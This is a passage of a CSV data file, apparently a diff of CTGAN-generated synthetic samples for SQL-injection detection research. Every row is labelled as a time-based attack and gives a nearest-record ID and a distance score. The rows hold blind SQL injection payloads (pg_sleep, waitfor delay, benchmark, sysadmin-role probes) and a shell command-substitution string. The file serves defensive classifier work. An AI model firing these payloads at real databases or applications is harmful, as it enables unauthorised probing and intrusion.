+CTGAN_000470,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,6.1607849758757816
+CTGAN_000471,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,7.160165035268665
+CTGAN_000472,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.070149205689857
+CTGAN_000473,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,6.799235508299099
+CTGAN_000474,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,6.946815783816607
+CTGAN_000475,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.036995069967163
+CTGAN_000476,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,7.265687333278476
+CTGAN_000477,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.188440921946482
+CTGAN_000478,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.463762477275135
+CTGAN_000479,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.733082766447083
+CTGAN_000480,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.7474206219681525
+CTGAN_000481,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.835447141642774
+CTGAN_000482,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,7.106412289147064
+CTGAN_000483,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,7.701568840288961
+CTGAN_000484,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.3850982567567405
+CTGAN_000485,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.7607802829573345
+CTGAN_000486,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,7.627750162721882
+CTGAN_000487,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.265075327229924
+CTGAN_000488,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,5.665604565260084
+CTGAN_000489,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,8.458512775459909
+CTGAN_000490,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.387514019579292
+CTGAN_000491,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,5.594303087430214
+CTGAN_000492,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,8.130093807627294
+CTGAN_000493,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,7.498816218527344
+CTGAN_000494,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.597440607418122
+CTGAN_000495,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,5.680069546449101
+CTGAN_000496,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,8.04875117698991
+CTGAN_000497,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.581281239727137
+CTGAN_000498,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,6.714459028791293
+CTGAN_000499,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,6.035603919736347
+CTGAN_000500,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,8.399532190985235
